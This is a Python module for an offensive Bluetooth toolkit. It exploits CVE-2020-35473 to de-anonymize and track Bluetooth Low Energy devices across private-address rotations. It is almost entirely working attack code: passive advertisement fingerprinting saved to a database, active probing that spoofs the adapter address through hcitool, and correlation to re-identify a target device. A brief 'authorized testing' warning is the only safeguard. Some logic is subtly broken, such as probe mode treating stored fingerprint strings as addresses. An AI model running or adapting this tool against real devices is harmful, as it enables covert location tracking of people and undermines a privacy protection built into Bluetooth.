"""
BlueSploit Auxiliary: BLE Resolvable Private Address De-anonymization

CVE-2020-35473: An information leakage vulnerability in the Bluetooth Low Energy
advertisement scan response in BLE Core Specifications 4.0 through 5.2, and
extended scan response in BLE Core Specifications 5.0 through 5.2.

An RPA (Resolvable Private Address) may be used to identify devices using the
response or non-response to specific scan requests from remote addresses. RPAs
that have been associated with a specific remote device may also be used to
identify a peer in the same manner by using its reaction to an active scan
request — an allowlist-based side channel.

Attack method:
  1. Maintain a database of previously seen RPA ↔ real-identity associations
  2. Send targeted active scan requests from known device addresses (real or spoofed)
  3. Observe which RPAs respond to which scan request source addresses
  4. Correlate response patterns to de-anonymize devices across RPA rotations
  5. Track device movement/presence across time without resolving IRK

Modes:
  observe  — Build RPA response fingerprint database passively
  probe    — Active: send scan requests from known addresses, log responses
  correlate — Cross-reference RPA patterns to re-identify previously seen devices
"""

import asyncio
import json
import os
import subprocess
import time
from typing import Dict, List, Optional, Set, Tuple
from core.base import AuxiliaryModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    from bleak import BleakScanner
    from bleak.backends.device import BLEDevice
    from bleak.backends.scanner import AdvertisementData
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False


def _is_rpa(addr: str) -> bool:
    """Check if address is a Resolvable Private Address (top 2 bits = 10)."""
    try:
        msb = int(addr.split(":")[0], 16)
        return (msb & 0xC0) == 0x40
    except (ValueError, IndexError):
        return False


def _is_nrpa(addr: str) -> bool:
    """Non-Resolvable Private Address (top 2 bits = 00)."""
    try:
        msb = int(addr.split(":")[0], 16)
        return (msb & 0xC0) == 0x00
    except (ValueError, IndexError):
        return False


def _fingerprint(adv: AdvertisementData) -> str:
    """Build a stable fingerprint from advertisement content (excluding address)."""
    parts = []
    for uuid in sorted(adv.service_uuids or []):
        parts.append(f"svc:{uuid}")
    for cid in sorted((adv.manufacturer_data or {}).keys()):
        parts.append(f"mfr:{cid:04x}:{(adv.manufacturer_data[cid] or b'').hex()[:16]}")
    for uuid in sorted((adv.service_data or {}).keys()):
        parts.append(f"sd:{uuid}")
    if adv.local_name:
        parts.append(f"name:{adv.local_name}")
    tx = getattr(adv, "tx_power", None)
    if tx is not None:
        parts.append(f"tx:{tx}")
    return "|".join(parts)


class Module(AuxiliaryModule):
    """
    BLE RPA De-anonymization via Allowlist Side-Channel (CVE-2020-35473)

    Builds a fingerprint database of BLE devices by observing which RPAs
    share advertisement content, response patterns, and timing characteristics
    to re-identify devices across RPA rotation events.
    """

    info = ModuleInfo(
        name="BLE RPA De-anonymization (CVE-2020-35473)",
        description=(
            "Exploit BLE RPA response side-channel to track and de-anonymize "
            "devices across address rotations without knowing their IRK"
        ),
        author=["v33ru"],
        protocol=BTProtocol.BLE,
        severity=Severity.MEDIUM,
        cve=["CVE-2020-35473"],
        references=[
            "https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/report-vulnerability/",
            "https://arxiv.org/abs/2004.11196",
            "https://petsymposium.org/2021/files/papers/issue3/popets-2021-0036.pdf",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="mode",
            required=True,
            description="Mode: observe, probe, correlate",
            default="observe",
        ))
        self.add_option(ModuleOption(
            name="duration",
            required=False,
            description="Observation/probe duration in seconds",
            default=120,
        ))
        self.add_option(ModuleOption(
            name="output_file",
            required=False,
            description="JSON database file to save/load RPA fingerprints",
            default="rpa_database.json",
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="target_fingerprint",
            required=False,
            description="Known fingerprint string to track (correlate mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="min_appearances",
            required=False,
            description="Min RPA appearances to include in analysis",
            default=2,
        ))

    def run(self) -> bool:
        if not BLEAK_AVAILABLE:
            print_error("bleak required — pip install bleak")
            return False

        mode     = (self.get_option("mode") or "observe").lower()
        duration = int(self.get_option("duration"))
        db_file  = self.get_option("output_file") or "rpa_database.json"
        adapter  = self.get_option("interface") or "hci0"
        min_app  = int(self.get_option("min_appearances"))
        target_fp = self.get_option("target_fingerprint")

        C = Colors
        print(f"\n  {C.RED}╔{'═'*58}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}BLE RPA De-anonymization{C.RESET}                                 {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*58}╝{C.RESET}\n")

        print_info(f"CVE         : CVE-2020-35473")
        print_info(f"Mode        : {mode}")
        print_info(f"Duration    : {duration}s")
        print_info(f"DB file     : {db_file}")
        print_warning("DISCLAIMER: For authorized security testing only!")

        if mode == "observe":
            return asyncio.run(self._observe(duration, db_file, min_app))
        if mode == "probe":
            return asyncio.run(self._probe(duration, adapter, db_file))
        if mode == "correlate":
            return self._correlate(db_file, target_fp, min_app)
        print_error(f"Unknown mode: {mode}")
        return False

    async def _observe(self, duration: int, db_file: str, min_app: int) -> bool:
        """
        Passively scan and build fingerprint database.
        Associates each observed RPA with its advertisement fingerprint,
        RSSI profile, and timing to enable re-identification on rotation.
        """
        print_info(f"\nBuilding RPA fingerprint database for {duration}s...")
        print_info("Tracking RPA ↔ advertisement content associations\n")

        # addr → list of {fingerprint, rssi, ts, adv_data}
        rpa_log: Dict[str, List[Dict]] = {}
        # fingerprint → set of addresses seen
        fp_to_addrs: Dict[str, Set[str]] = {}

        def on_detect(device: BLEDevice, adv: AdvertisementData):
            addr = device.address.upper()
            if not (_is_rpa(addr) or _is_nrpa(addr)):
                return  # Skip static/public addresses

            fp = _fingerprint(adv)
            ts = time.time()

            if addr not in rpa_log:
                rpa_log[addr] = []
            rpa_log[addr].append({"fp": fp, "rssi": adv.rssi, "ts": ts})

            if fp not in fp_to_addrs:
                fp_to_addrs[fp] = set()
            fp_to_addrs[fp].add(addr)

            if len(rpa_log[addr]) == 1:
                addr_type = "RPA" if _is_rpa(addr) else "NRPA"
                print_info(f"  [{addr_type}] {addr} fp={fp[:40]}…")

        scanner = BleakScanner(detection_callback=on_detect)
        await scanner.start()
        start = time.time()
        while time.time() - start < duration:
            await asyncio.sleep(5)
            rpa_count = sum(1 for addrs in rpa_log.values() if len(addrs) >= min_app)
            print(f"\r  Tracked: {len(rpa_log)} addresses | "
                  f"Fingerprints: {len(fp_to_addrs)} | "
                  f"Rich: {rpa_count}", end="", flush=True)
        await scanner.stop()
        print()

        # Identify fingerprints shared by multiple RPAs (rotation events)
        rotation_groups = []
        for fp, addrs in fp_to_addrs.items():
            if len(addrs) >= min_app:
                rotation_groups.append({
                    "fingerprint": fp,
                    "addresses": sorted(addrs),
                    "rotation_count": len(addrs),
                })

        if rotation_groups:
            print_success(f"\nFound {len(rotation_groups)} device(s) with RPA rotations:")
            for grp in sorted(rotation_groups, key=lambda x: -x["rotation_count"])[:10]:
                print_success(
                    f"  Device (fp={grp['fingerprint'][:30]}…): "
                    f"{grp['rotation_count']} addresses — {', '.join(grp['addresses'][:5])}"
                )

        # Save database
        db = {
            "generated": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "duration_s": duration,
            "addresses": {
                addr: entries for addr, entries in rpa_log.items()
                if len(entries) >= min_app
            },
            "fingerprints": {fp: sorted(addrs) for fp, addrs in fp_to_addrs.items()},
            "rotation_groups": rotation_groups,
        }
        try:
            with open(db_file, "w") as f:
                json.dump(db, f, indent=2)
            print_success(f"Database saved to {db_file}")
        except OSError as e:
            print_error(f"Cannot write database: {e}")

        self.add_result({
            "cve": "CVE-2020-35473",
            "mode": "observe",
            "addresses_tracked": len(rpa_log),
            "rotation_groups": len(rotation_groups),
            "db_file": db_file,
        })
        return len(rotation_groups) > 0

    async def _probe(self, duration: int, adapter: str, db_file: str) -> bool:
        """
        Active probe: set local adapter address to known device addresses,
        observe which RPAs respond to scan requests — allowlist side-channel.
        A device using an allowlist will only respond to scan requests from
        trusted addresses; non-response from a new address confirms RPA identity.
        """
        print_info(f"\nActive allowlist side-channel probe for {duration}s")
        print_info("Sending scan requests from various source addresses")
        print_warning("This requires adapter address spoofing via hcitool/bdaddr")

        responses: Dict[str, Dict[str, int]] = {}  # rpa → {src_addr: response_count}

        # Load known source addresses from database if available
        probe_addrs = []
        if os.path.isfile(db_file):
            try:
                with open(db_file) as f:
                    db = json.load(f)
                probe_addrs = list(db.get("fingerprints", {}).keys())[:5]
                print_info(f"Loaded {len(probe_addrs)} fingerprints from {db_file}")
            except Exception:
                pass

        if not probe_addrs:
            # Generate random source addresses as probe
            import secrets
            probe_addrs = [
                ":".join(f"{b:02X}" for b in secrets.token_bytes(6))
                for _ in range(3)
            ]
            print_info(f"Using {len(probe_addrs)} random probe source addresses")

        # Scan with different local addresses and compare which RPAs respond
        for src_addr in probe_addrs:
            print_info(f"\nProbing with src={src_addr}...")

            # Spoof adapter address
            try:
                subprocess.run(
                    ["hcitool", "-i", adapter, "cmd", "0x08", "0x0005"] +
                    [f"0x{int(b, 16):02x}" for b in reversed(src_addr.split(":"))],
                    capture_output=True, timeout=3
                )
            except Exception:
                pass

            seen_in_scan: Set[str] = set()

            def on_detect(device: BLEDevice, adv: AdvertisementData):
                addr = device.address.upper()
                if _is_rpa(addr) or _is_nrpa(addr):
                    seen_in_scan.add(addr)
                    if addr not in responses:
                        responses[addr] = {}
                    responses[addr][src_addr] = responses[addr].get(src_addr, 0) + 1

            scanner = BleakScanner(detection_callback=on_detect)
            await scanner.start()
            await asyncio.sleep(min(duration // len(probe_addrs), 30))
            await scanner.stop()

            print_info(f"  Seen {len(seen_in_scan)} private addresses responding to {src_addr}")

        # Identify address-selective responders (allowlist-based devices)
        selective = {
            addr: resp for addr, resp in responses.items()
            if len(resp) < len(probe_addrs)  # responded to some but not all
        }

        print_success(f"\nAllowlist-selective devices: {len(selective)}")
        for addr, resp in list(selective.items())[:10]:
            print_success(f"  {addr}: responded to {len(resp)}/{len(probe_addrs)} sources")

        self.add_result({
            "cve": "CVE-2020-35473",
            "mode": "probe",
            "probe_addresses": probe_addrs,
            "selective_responders": len(selective),
            "responses": {k: v for k, v in list(responses.items())[:20]},
        })
        return len(selective) > 0

    def _correlate(self, db_file: str, target_fp: Optional[str],
                   min_app: int) -> bool:
        """
        Correlate database entries to re-identify known devices by fingerprint.
        If target_fingerprint is set, find all addresses that match it.
        """
        if not os.path.isfile(db_file):
            print_error(f"Database file not found: {db_file}")
            print_info("Run 'observe' mode first to build the database")
            return False

        try:
            with open(db_file) as f:
                db = json.load(f)
        except Exception as e:
            print_error(f"Cannot load database: {e}")
            return False

        rotation_groups = db.get("rotation_groups", [])
        fingerprints    = db.get("fingerprints", {})

        print_info(f"\nDatabase contains {len(fingerprints)} fingerprints, "
                   f"{len(rotation_groups)} rotation groups")

        if target_fp:
            # Find groups matching target fingerprint prefix
            matches = [g for g in rotation_groups
                       if target_fp.lower() in g["fingerprint"].lower()]
            if matches:
                print_success(f"\nFound {len(matches)} group(s) matching fingerprint:")
                for m in matches:
                    print_success(
                        f"  {m['rotation_count']} rotations: {', '.join(m['addresses'][:8])}"
                    )
            else:
                print_warning("No groups matching target fingerprint")
                return False
        else:
            # Show top re-identified devices
            print_success(f"\nTop re-identified devices (by rotation count):")
            for grp in sorted(rotation_groups, key=lambda x: -x["rotation_count"])[:15]:
                print_success(
                    f"  [{grp['rotation_count']} rotations] fp={grp['fingerprint'][:40]}…\n"
                    f"    Addresses: {', '.join(grp['addresses'][:6])}"
                )

        self.add_result({
            "cve": "CVE-2020-35473",
            "mode": "correlate",
            "rotation_groups": len(rotation_groups),
            "total_fingerprints": len(fingerprints),
        })
        return len(rotation_groups) > 0
